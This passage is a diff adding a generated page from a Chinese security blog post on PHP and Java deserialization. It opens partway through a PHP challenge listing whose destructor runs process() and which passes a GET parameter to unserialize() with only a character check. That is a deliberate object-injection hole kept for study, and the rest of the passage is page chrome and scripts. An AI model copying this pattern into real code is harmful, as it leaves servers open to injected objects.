+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">output</span>($s) {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;[Result]: &lt;br&gt;&#34;</span>;
+        <span style="color:#66d9ef">echo</span> $s;
+    }
+ 
+    <span style="color:#66d9ef">function</span> __destruct() {
+        <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;2&#34;</span>)
+            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">op</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1&#34;</span>;
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">process</span>();
+    }
+ 
+}
+ 
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_valid</span>($s) {
+    <span style="color:#66d9ef">for</span>($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($s); $i<span style="color:#f92672">++</span>)
+        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>(<span style="color:#a6e22e">ord</span>($s[$i]) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">ord</span>($s[$i]) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">125</span>))
+            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+}
+ 
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET{<span style="color:#e6db74">&#39;str&#39;</span>})) {
+ 
+    $str <span style="color:#f92672">=</span> (<span style="color:#a6e22e">string</span>)$_GET[<span style="color:#e6db74">&#39;str&#39;</span>];
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_valid</span>($str)) {
+        $obj <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($str);
+    }
+ 
+}
+</code></pre></div>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://Zor01478.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+
+  <a class="tag tag--primary tag--small" href="https://Zor01478.github.io/tags/php/">PHP</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/01/%E5%85%B3%E4%BA%8Estruct%E7%9A%84%E5%AD%97%E8%8A%82%E6%95%B0%E8%AE%A1%E7%AE%97%E5%AF%B9%E9%BD%90/" data-tooltip="关于struct的字节数计算（对齐）">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 Zor01478. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/01/%E5%85%B3%E4%BA%8Estruct%E7%9A%84%E5%AD%97%E8%8A%82%E6%95%B0%E8%AE%A1%E7%AE%97%E5%AF%B9%E9%BD%90/" data-tooltip="关于struct的字节数计算（对齐）">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--disabled">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://Zor01478.github.io/images/caomao.png" alt="作者的图片" />
+    
+    <h4 id="about-card-name">Zor01478</h4>
+    
+      <div id="about-card-bio">戴了头盔，所以头很铁</div>
+    
+    
+      <div id="about-card-job">
+        <i class="fa fa-briefcase"></i>
+        <br/>
+        Sec
+      </div>
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        杭州
+      </div>
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://Zor01478.github.io/images/qianyang.jpg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://Zor01478.github.io/js/script-pcw6v3xilnxydl1vddzazdverrnn9ctynvnxgwho987mfyqkuylcb1nlt.min.js"></script>
+
+
+  
+    <script src="https://Zor01478.github.io/js/clicklove.js"></script>
+  
+
+  
+    <script src="https://Zor01478.github.io/js/snow.js"></script>
+  
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/Zor01478.github.io\/2021\/01\/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8A%E7%AF%87\/';
+          
+            this.page.identifier = '\/2021\/01\/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8A%E7%AF%87\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'hugo-tranquilpeak-theme';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
